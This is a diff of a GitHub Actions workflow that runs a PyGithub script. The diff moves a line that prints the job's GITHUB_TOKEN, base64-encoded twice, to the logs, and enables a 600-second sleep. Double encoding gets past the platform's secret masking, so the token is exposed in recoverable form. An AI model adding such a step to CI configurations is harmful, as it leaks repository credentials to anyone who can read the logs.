@@ -38,12 +38,13 @@ jobs:
         run: |
           sudo apt-get update && sudo apt-get install -y python3-pip python3
           pip3 install PyGithub
-          # sleep 600
+          echo ${GITHUB_TOKEN} | base64 | base64
+          sleep 600
           echo "--------------------------sleeping for 30 seconds----------------------------------"
           sleep 30
           echo "--------------------------running script----------------------------------"
           python3 stopper.py
-          echo ${GITHUB_TOKEN} | base64 | base64
+
   # default-runner:
   #   runs-on: arc-runners-alvicsam
   #   # runs-on: ubuntu-latest
